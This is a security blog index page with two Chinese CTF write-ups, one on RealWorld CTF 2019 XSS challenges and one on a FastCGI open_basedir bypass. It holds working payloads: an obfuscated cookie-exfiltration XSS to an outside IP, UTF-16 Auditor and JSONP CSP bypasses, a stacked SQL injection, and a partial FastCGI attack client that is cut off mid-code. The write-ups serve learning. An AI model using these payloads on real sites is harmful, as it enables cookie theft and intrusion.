<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Hpdoger
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Finance behind Passion in Security
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/friends/" class="menu-item-link">
                        Friends
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
        </ul>
    </nav>
</header>
    <main class="main">
        <section class="posts">
    
        <article class="post">
            <h1>
                <a class="title" href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/"> 
                    RealWorld CTF2019 两道XSS-Web题解 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-09-24   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="RealWorld-CTF2019-两道XSS-Web题解"><a href="#RealWorld-CTF2019-两道XSS-Web题解" class="headerlink" title="RealWorld CTF2019 两道XSS-Web题解"></a>RealWorld CTF2019 两道XSS-Web题解</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186707" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186707</a></p>
<h2 id="Mission-Invisible"><a href="#Mission-Invisible" class="headerlink" title="Mission Invisible"></a>Mission Invisible</h2><p>题目上来把代码全部给出来了，一段js并且告诉我们有两个隐藏的点</p>
<pre><code>&lt;script&gt;
    var getUrlParam = function (name) {
        var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);
        var r = unescape(window.location.search.substr(1)).match(reg);
        if (r != null) return r[2];
        return null;
    }

    function setCookie(name, value) {
        var Days = 30;
        var exp = new Date();
        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 30);
        document.cookie = name + &quot;=&quot; + value + &quot;;expires=&quot; + exp.toGMTString();
    }

    function getCookie(name) {
        var search = name + &quot;=&quot;
        var offset = document.cookie.indexOf(search)
        if (offset != -1) {
            offset += search.length;
            var end = document.cookie.indexOf(&quot;;&quot;, offset);
            if (end == -1) {
                end = document.cookie.length;
            }
            return unescape(document.cookie.substring(offset, end));
        }
        else return &quot;&quot;;
    }

    function setElement(tag) {
        tag = tag.substring(0, 1);
        var ele = document.createElement(tag)
        var attrs = getCookie(&quot;attrs&quot;).split(&quot;&amp;&quot;);
        for (var i = 0; i &lt; attrs.length; i++) {
            var key = attrs[i].split(&quot;=&quot;)[0];
            var value = attrs[i].split(&quot;=&quot;)[1];
            ele.setAttribute(key, value);
        }
        document.body.appendChild(ele);
    }

    var tag = getUrlParam(&quot;tag&quot;);
    setCookie(&quot;tag&quot;, tag);
    setElement(tag);

&lt;/script&gt;</code></pre><p>重点在这个<code>setElement</code>函数，通过tag.substring(0, 1)创建一个dom事件，然后从cookie种取出attrs属性进行标签属性的赋值。接下来追一下cookie是怎么入库的</p>
<pre><code>var tag = getUrlParam(&quot;tag&quot;);
setCookie(&quot;tag&quot;, tag);</code></pre><p>追到函数不难发现是tag传参进去的，并且在<code>getcookie</code>函数中只截取了”attrs=”的后面的值，那么我们就可以在value里插入attrs的值。</p>
<p><img src="http://static.zybuluo.com/1160307775/8nnawoe6cckqbj8v45i7u28p/image_1dksu3lma1sdcaodk0j19g11tn213.png" alt="image_1dksu3lma1sdcaodk0j19g11tn213.png-115.9kB"></p>
<p>所以现在的难点就在于怎么构造一个标签，在浏览器解析的时候自动触发XSS。由于<code>tag = tag.substring(0, 1);</code>这段代码，使得我们现在能用的标签只有a、p。</p>
<p>最初我的想法是污染原型链，在循环遍历attrs的时候：</p>
<pre><code>第一次key = __proto__.ele  &amp; value = document.createElement(“script”)

第二次 key = src  &amp; value = evil.com</code></pre><p>但是尝试了一下发现这样并不能够成功污染，因为我们已经定义了ele这个变量。那只能从a、p标签下手，这里@LFY师傅想到一个很好的方法</p>
<p><img src="http://static.zybuluo.com/1160307775/qxend2mls2etcgiz0das8h9z/image_1dksuhiqvuci17tssl8o111eh720.png" alt="image_1dksuhiqvuci17tssl8o111eh720.png-97.5kB"></p>
<pre><code>&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt;</code></pre><p>我们可以通过tableindex使标签可聚焦，只需要在url后面跟一个锚点指向标签id，类似于<code>#1</code>，这样聚焦时触发onfocus，效果就等效于自动触发xss。</p>
<pre><code>http://52.52.236.217:16401/?tag=a%3d1attrs%3donmouserover%3d1%2526onfocus%3dalert(1)%2526id%3d1%2526tabindex%3d0#1</code></pre><p><img src="http://static.zybuluo.com/1160307775/guipvs8t8hxfv0rxvm7hvjse/image_1dksundi8iu3lrfhnnpkunra2d.png" alt="image_1dksundi8iu3lrfhnnpkunra2d.png-249.6kB"></p>
<p>接着就是常规打cookie到本地</p>
<pre><code>http://52.52.236.217:16401/?tag=a=attrs=onmouseover=1%2526onfocus=eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,49,51,57,46,49,57,57,46,50,48,51,46,50,53,51,58,49,50,51,52,47,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))%2526id=1%2526tabindex=0#1</code></pre><h2 id="Hcorme"><a href="#Hcorme" class="headerlink" title="Hcorme"></a>Hcorme</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>首先题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript</p>
<p><img src="http://static.zybuluo.com/1160307775/ieklsfj1adpr8wcyfwcp6k29/image_1dkseq56a1q3f111911ftas01les9.png" alt="image_1dkseq56a1q3f111911ftas01les9.png-111.3kB"></p>
<p>于此同时题目有两个难点需要bypass：</p>
<ul>
<li>XSS Auditor的限制<br><img src="http://static.zybuluo.com/1160307775/i0q4o5jr15jip56ufv4qbx5b/image_1dksf8oneelujp2n651k3a1qbu13.png" alt="image_1dksf8oneelujp2n651k3a1qbu13.png-183.7kB"></li>
</ul>
<ul>
<li>CSP的限制<pre><code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></pre></li>
</ul>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>先着眼xss auditor这个点，在Chrome78以后XSS-Auditor被Chrome自家砍掉了，虽然auditor曾是不少xsser在面对反射性XSS时候的难题，但随着bypass的方法也日益增多，auditor的弊远远大于利：因为auditor在触发的时候会删除恶意输入，之前我博客中有一篇文章<a href="https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/">前端全局变量劫持</a>，就能够利用Auditor达到变量劫持的目的。</p>
<p>于此同时Bypass auditor也算是出题人给我们的Hint。</p>
<p>当时我的思路是用字符集去bypass，也就是下面这种思路<br><img src="http://static.zybuluo.com/1160307775/urr4wey9p4wqrnt88qknu6el/image_1dksffho3ttit161ctftckbo61g.png" alt="image_1dksffho3ttit161ctftckbo61g.png-62.5kB"></p>
<p>因为auditor的核心思路就是拿浏览器的渲染和我们的输入做比较，不相符则不会被Check。不过chrome77已经不存在iso-2022-jp这种绕过的方法。接下来我们看一下Hardold师傅的思路–&gt;<strong>utf-16编码绕过</strong></p>
<p>这里串一个编码的知识点，通常我们看到%xx%xx这类的url编码，其实是用16进制表示的，比如utf-8编码形式如下</p>
<pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote
&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-8&#39;)))
&gt;&gt;&gt; %E7%8C%AA</code></pre><p>那么”猪”这个字在utf-8编码下就是<code>0xe7 0x8c 0xaa</code>，下面我们来看一下utf-16编码下的”猪”怎么表示</p>
<pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote
&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-16&#39;)))
&gt;&gt;&gt; %FF%FE%2As</code></pre><p>这时会发现，用utf-16无论编码什么字符，前两个字节都是``0xff0xfe`<br><img src="http://static.zybuluo.com/1160307775/hw1p5epypji3hs4ceofrjada/image_1dksl9ssig0pv2l1f171qr31c5q1t.png" alt="image_1dksl9ssig0pv2l1f171qr31c5q1t.png-98.4kB"></p>
<p>因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。</p>
<p>此时我们来尝试一下能否Bypass XSS Auditor</p>
<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p><img src="http://static.zybuluo.com/1160307775/wosh7er7qz9zoevz5m9lv3tx/image_1dksm95e81qka1ts9meii2m1cd92q.png" alt="image_1dksm95e81qka1ts9meii2m1cd92q.png-227.5kB"></p>
<p>成功插入标签，接下来到了第二步，Bypass CSP。因为锁了default-src又没有给unsafe-inline，但是题目有一个jsonp的点，不难想到今年的那道<a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">ins’hack 2019/的bypasses-everywhere</a></p>
<p>这篇文章的大意相当于利用jsonp直接把js代码”挂载”到本地的script标签里面，从而导致的bypass。那么我们编写一个demo看看</p>
<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00a%00l%00e%00r%00t%00%28%001%00%29%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p>可以看到进行了两次资源请求，第二次的资源的执行类型是script<br><img src="http://static.zybuluo.com/1160307775/jo3855qgvjiy2kl23v5m050f/image_1dkssc09a13h01mnh8561rft1g0u9.png" alt="image_1dkssc09a13h01mnh8561rft1g0u9.png-154.8kB"></p>
<p>接着就是把flag打到自己的本地就行了</p>
<pre><code>&gt;&gt;&gt; print(quote((&quot;&lt;script/src=?callback=window.location=&#39;http://xxx/?&#39;%2bdocument.cookie%0a//&gt;&lt;/script&gt;&quot;).encode(&#39;utf-16&#39;)))

%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00w%00i%00n%00d%00o%00w%00.%00l%00o%00c%00a%00t%00i%00o%00n%00%3D%00%27%00h%00t%00t%00p%00%3A%00/%00/%00x%00x%00x%00/%00%3F%00%27%00%25%002%00b%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e%00%25%000%00a%00/%00/%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><h2 id="比赛总结"><a href="#比赛总结" class="headerlink" title="比赛总结"></a>比赛总结</h2><p>赛题质量真心高，膜Harlold师傅，日常拿0day打比赛..orz</p>

                
            </div>
            <div class="continue">
            <a href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/"> 
                    从一道CTF学习Fastcgi绕过姿势 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-09-17   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="从一道CTF学习Fastcgi绕过姿势"><a href="#从一道CTF学习Fastcgi绕过姿势" class="headerlink" title="从一道CTF学习Fastcgi绕过姿势"></a>从一道CTF学习Fastcgi绕过姿势</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186186" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186186</a></p>
<p>周末做了一个字节跳动的CTF比赛，其中blog这道题涉及到了disable_functions和open_basedir的限制。在0CTF中出现了类似的考法，给了命令执行点去Bypass Disable_functions&amp;Open_basedir，以前没有做过相关的题，这次记录一下思路和用到的脚本。</p>
<p>关于0CTF的题解，参考飘零师傅：<a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a></p>
<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>当然这题不像0ctf上来就给了你命令执行点，要挖掘一下。简单记一下wp，这部分不细讲。首先是给了全部的源码，在replace.php页面有一个重要功能</p>
<p><img src="http://static.zybuluo.com/1160307775/zojwvlchmoeamdiicqepfg7n/image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png" alt="image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png-429.4kB"></p>
<p>题目的PHP环境是5.3.3所以<code>preg_replace</code>函数是存在一个代码执行的，正好参数又是可控，$replace部分将会被当作php代码执行。</p>
<p>只不过需要先从库里执行这样一句话:<code>$sql-&gt;query(&quot;select isvip from users where id=&quot; . $_SESSION[&#39;id&#39;] . &quot;;&quot;)</code>取校验是否isvip==1，默认注册的所有用户isvip==0。</p>
<p>通过某种方式改变自己的<code>isvip</code>字段，看了下config.php出题人还上了一个waf，直接注入基本不可能。但是它没有过滤SET这个关键词，而且PDO在php5.3以后是支持多条查询的，这给我们堆叠注入创造了机会。<br><img src="http://static.zybuluo.com/1160307775/6cr621hta58y7gic89n0acyf/image_1dkakdh2q164i1hfok7m12koug44g.png" alt="image_1dkakdh2q164i1hfok7m12koug44g.png-440.4kB"></p>
<p>在<code>edit.php</code>有一个很典型的二次注入，太长时间没接触一时没看出来。虽然$title在第一次入库时是经过了addslashes，但是在mysql存储的时候并不会加入<code>\</code>，导致<code>edit.php</code>页面引入之前存储的title字段产生成二次注入。<br><img src="http://static.zybuluo.com/1160307775/eiuxvnfo96iboan9shzwvql4/image_1dkakhsvmfcsqck1pkabm5dgj4t.png" alt="image_1dkakhsvmfcsqck1pkabm5dgj4t.png-405.6kB"></p>
<p>直接贴payload，注入语句用16进制代替在@SQL中了，这种绕过思路在强网杯的题目上也有用到。也可以用concat()+16进制单字符绕。</p>
<pre><code>hpdoger&#39;;SET @SQL=0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227;PREPARE pord FROM @SQL;EXECUTE pord;# 

0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227
=&gt;
UPDATE users SET isvip=1 WHERE username=&#39;hpdoger&#39;</code></pre><p>isvip==1就能代码执行了，phpinfo()看了一下，有disable_funcions和open_basedir的限制，而且过滤跟0CTF那道题很相似，但是没有安装Imagick拓展<br><img src="http://static.zybuluo.com/1160307775/7u4yy60zxzdd21m1tsqdrk2i/image_1dkakvbks1m3dlh01vaarvb17l85n.png" alt="image_1dkakvbks1m3dlh01vaarvb17l85n.png-266.2kB"></p>
<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail</code></pre><h2 id="什么是FastCGI和FPM"><a href="#什么是FastCGI和FPM" class="headerlink" title="什么是FastCGI和FPM"></a>什么是FastCGI和FPM</h2><p>举个例子，如果我们请求index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。Web Server 一般指Apache、Nginx、IIS、Lighttpd、Tomcat等服务器<br><img src="http://static.zybuluo.com/1160307775/69lriwpxmlxmybbhn5u7a0we/image_1dkah71fj1l9u4mu2gfsd2q6d9.png" alt="image_1dkah71fj1l9u4mu2gfsd2q6d9.png-61.5kB"></p>
<h3 id="CGI-amp-FastCGI"><a href="#CGI-amp-FastCGI" class="headerlink" title="CGI&amp;FastCGI"></a>CGI&amp;FastCGI</h3><p>CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具。WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。</p>
<p>FastCGI是用来提高CGI程序性能的。类似于CGI，<strong>FastCGI也可以说是一种协议</strong>。简单来说就是CGI的优化：对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p>
<p>FastCGI的工作原理如下：<br><img src="http://static.zybuluo.com/1160307775/9a80mehqfymaajjef8zfagch/image_1dkahc1jogup1l5v1dlr9qe1c1n26.png" alt="image_1dkahc1jogup1l5v1dlr9qe1c1n26.png-88.7kB"></p>
<p>1、Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</p>
<p>2、FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</p>
<p>3、当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</p>
<p>4、FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</p>
<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p>FPM(php-fastcgi program manager)顾名思义，这是一个PHP专用的 fastcgi 管理器。也就是说，PHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自Web服务器的请求。目前，PHP5.3版本之后，PHP-FPM是内置于PHP的。因为PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。</p>
<h2 id="open-basedir的绕过"><a href="#open-basedir的绕过" class="headerlink" title="open_basedir的绕过"></a>open_basedir的绕过</h2><p>前提是我们能够执行一段php程序来伪造FastCGI.php</p>
<p>在PHP中：</p>
<ul>
<li><p>可以通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></p>
</li>
<li><p>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</p>
</li>
</ul>
<h3 id="FastCGI脚本"><a href="#FastCGI脚本" class="headerlink" title="FastCGI脚本"></a>FastCGI脚本</h3><pre><code>&lt;?php
class TimedOutException extends \Exception {
}
class ForbiddenException extends \Exception {
}
class Client {
const VERSION_1 = 1;
const BEGIN_REQUEST = 1;
const ABORT_REQUEST = 2;
const END_REQUEST = 3;
const PARAMS = 4;
const STDIN = 5;
const STDOUT = 6;
const STDERR = 7;
const DATA = 8;
const GET_VALUES = 9;
const GET_VALUES_RESULT = 10;
const UNKNOWN_TYPE = 11;
const MAXTYPE = self::UNKNOWN_TYPE;
const RESPONDER = 1;
const AUTHORIZER = 2;
const FILTER = 3;
const REQUEST_COMPLETE = 0;
const CANT_MPX_CONN = 1;
const OVERLOADED = 2;
const UNKNOWN_ROLE = 3;
const MAX_CONNS = &#39;MAX_CONNS&#39;;
const MAX_REQS = &#39;MAX_REQS&#39;;
const MPXS_CONNS = &#39;MPXS_CONNS&#39;;
const HEADER_LEN = 8;
const REQ_STATE_WRITTEN = 1;
const REQ_STATE_OK = 2;
const REQ_STATE_ERR = 3;
const REQ_STATE_TIMED_OUT = 4;
private $_sock = null;
private $_host = null;
private $_port = null;
private $_keepAlive = false;
private $_requests = array();
private $_persistentSocket = false;
private $_connectTimeout = 5000;
private $_readWriteTimeout = 5000;
public function __construct( $host, $port ) {
    $this-&gt;_host = $host;
    $this-&gt;_port = $port;
}
public function setKeepAlive( $b ) {
          $this-&gt;_keepAlive = (boolean) $b;
          if ( ! $this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock ) {
              fclose( $this-&gt;_sock );
    }
}
public function getKeepAlive() {
    return $this-&gt;_keepAlive;
}
public function setPersistentSocket( $b ) {
          $was_persistent          = ( $this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket );
          $this-&gt;_persistentSocket = (boolean) $b;
          if ( ! $this-&gt;_persistentSocket &amp;&amp; $was_persistent ) {
              fclose( $this-&gt;_sock );
    }
}
public function getPersistentSocket() {
    return $this-&gt;_persistentSocket;
}
public function setConnectTimeout( $timeoutMs ) {
          $this-&gt;_connectTimeout = $timeoutMs;
}
public function getConnectTimeout() {
    return $this-&gt;_connectTimeout;
}
public function setReadWriteTimeout( $timeoutMs ) {
          $this-&gt;_readWriteTimeout = $timeoutMs;
          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
}
public function getReadWriteTimeout() {
    return $this-&gt;_readWriteTimeout;
}
private function set_ms_timeout( $timeoutMs ) {
          if ( ! $this-&gt;_sock ) {
        return false;
    }
    return stream_set_timeout( $this-&gt;_sock, floor( $timeoutMs / 1000 ), ( $timeoutMs % 1000 ) * 1000 );
}
private function connect() {
    if ( ! $this-&gt;_sock ) {
              if ( $this-&gt;_persistentSocket ) {
                  $this-&gt;_sock = pfsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
              } else {
                  $this-&gt;_sock = fsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
              }
              if ( ! $this-&gt;_sock ) {
                  throw new \Exception( &#39;Unable to connect to FastCGI application: &#39; . $errstr );
              }
              if ( ! $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ) ) {
            throw new \Exception( &#39;Unable to set timeout on socket&#39; );
        }
    }
}
private function buildPacket( $type, $content, $requestId = 1 ) {
          $clen = strlen( $content );
    return chr( self::VERSION_1 )         /* version */
           . chr( $type )                    /* type */
                 . chr( ( $requestId &gt;&gt; 8 ) &amp; 0xFF ) /* requestIdB1 */
           . chr( $requestId &amp; 0xFF )        /* requestIdB0 */
                 . chr( ( $clen &gt;&gt; 8 ) &amp; 0xFF )     /* contentLengthB1 */
           . chr( $clen &amp; 0xFF )             /* contentLengthB0 */
                 . chr( 0 )                        /* paddingLength */
                 . chr( 0 )                        /* reserved */
                 . $content;                     /* content */
}
private function buildNvpair( $name, $value ) {
    $nlen = strlen( $name );
    $vlen = strlen( $value );
    if ( $nlen &lt; 128 ) {
              /* nameLengthB0 */
              $nvpair = chr( $nlen );
          } else {
              /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
              $nvpair = chr( ( $nlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $nlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $nlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $nlen &amp; 0xFF );
          }
          if ( $vlen &lt; 128 ) {
        /* valueLengthB0 */
        $nvpair .= chr( $vlen );
    } else {
        /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
        $nvpair .= chr( ( $vlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $vlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $vlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $vlen &amp; 0xFF );
    }
    /* nameData &amp; valueData */
    return $nvpair . $name . $value;
}
private function readNvpair( $data, $length = null ) {
    $array = array();
          if ( $length === null ) {
        $length = strlen( $data );
    }
    $p = 0;
          while ( $p != $length ) {
              $nlen = ord( $data{$p ++} );
              if ( $nlen &gt;= 128 ) {
                  $nlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
                  $nlen |= ( ord( $data{$p ++} ) );
              }
              $vlen = ord( $data{$p ++} );
              if ( $vlen &gt;= 128 ) {
                  $vlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
                  $vlen |= ( ord( $data{$p ++} ) );
              }
              $array[ substr( $data, $p, $nlen ) ] = substr( $data, $p + $nlen, $vlen );
              $p                                   += ( $nlen + $vlen );
    }
    return $array;
}
private function decodePacketHeader( $data ) {
          $ret                  = array();
          $ret[&#39;version&#39;]       = ord( $data{0} );
          $ret[&#39;type&#39;]          = ord( $data{1} );
          $ret[&#39;requestId&#39;]     = ( ord( $data{2} ) &lt;&lt; 8 ) + ord( $data{3} );
          $ret[&#39;contentLength&#39;] = ( ord( $data{4} ) &lt;&lt; 8 ) + ord( $data{5} );
          $ret[&#39;paddingLength&#39;] = ord( $data{6} );
          $ret[&#39;reserved&#39;]      = ord( $data{7} );
    return $ret;
}
private function readPacket() {
    if ( $packet = fread( $this-&gt;_sock, self::HEADER_LEN ) ) {
        $resp            = $this-&gt;decodePacketHeader( $packet );
              $resp[&#39;content&#39;] = &#39;&#39;;
        if ( $resp[&#39;contentLength&#39;] ) {
                  $len = $resp[&#39;contentLength&#39;];
                  while ( $len &amp;&amp; ( $buf = fread( $this-&gt;_sock, $len ) ) !== false ) {
                      $len             -= strlen( $buf );
                      $resp[&#39;content&#39;] .= $buf;
                  }
              }
              if ( $resp[&#39;paddingLength&#39;] ) {
            $buf = fread( $this-&gt;_sock, $resp[&#39;paddingLength&#39;] );
        }
        return $resp;
    } else {
        return false;
    }
}
public function getValues( array $requestedInfo ) {
          $this-&gt;connect();
          $request = &#39;&#39;;
          foreach ( $requestedInfo as $info ) {
              $request .= $this-&gt;buildNvpair( $info, &#39;&#39; );
          }
          fwrite( $this-&gt;_sock, $this-&gt;buildPacket( self::GET_VALUES, $request, 0 ) );
          $resp = $this-&gt;readPacket();
          if ( $resp[&#39;type&#39;] == self::GET_VALUES_RESULT ) {
              return $this-&gt;readNvpair( $resp[&#39;content&#39;], $resp[&#39;length&#39;] );
    } else {
        throw new \Exception( &#39;Unexpected response type, expecting GET_VALUES_RESULT&#39; );
    }
}
public function request( array $params, $stdin ) {
    $id = $this-&gt;async_request( $params, $stdin );
    return $this-&gt;wait_for_response( $id );
}
public function async_request( array $params, $stdin ) {
    $this-&gt;connect();
          // Pick random number between 1 and max 16 bit unsigned int 65535
          $id = mt_rand( 1, ( 1 &lt;&lt; 16 ) - 1 );
    // Using persistent sockets implies you want them keept alive by server!
    $keepAlive     = intval( $this-&gt;_keepAlive || $this-&gt;_persistentSocket );
          $request       = $this-&gt;buildPacket( self::BEGIN_REQUEST
              , chr( 0 ) . chr( self::RESPONDER ) . chr( $keepAlive ) . str_repeat( chr( 0 ), 5 )
        , $id
          );
          $paramsRequest = &#39;&#39;;
    foreach ( $params as $key =&gt; $value ) {
              $paramsRequest .= $this-&gt;buildNvpair( $key, $value, $id );
          }
          if ( $paramsRequest ) {
